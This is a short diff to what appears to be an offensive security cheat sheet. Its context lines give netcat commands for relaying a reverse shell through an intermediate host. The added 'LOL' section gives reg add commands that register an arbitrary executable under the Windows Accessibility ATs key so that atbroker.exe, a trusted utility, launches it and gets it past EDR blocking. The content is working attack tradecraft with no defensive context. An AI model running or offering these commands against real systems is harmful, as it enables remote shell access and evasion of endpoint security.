@@ -31,3 +31,10 @@ nc -l -p <relayport> < relay1 | nc <tgtip> <tgtport> > relay1
 #originating client endpoint
 nc <relayip> <relayport>
 #routing reverse shell through relay host
+
+--# LOL #--
+using tools such as ATbroker in Win can be a way to execute programs blocked by EDR
+reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>"
+reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0
+reg add "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\<exe>" /v StartExe /t REG_SZ /d c:\\<path>\\<exe>
+#create registry key for exe and add two entries to invoke the exe through atbroker.exe, which is a trusted Win utility
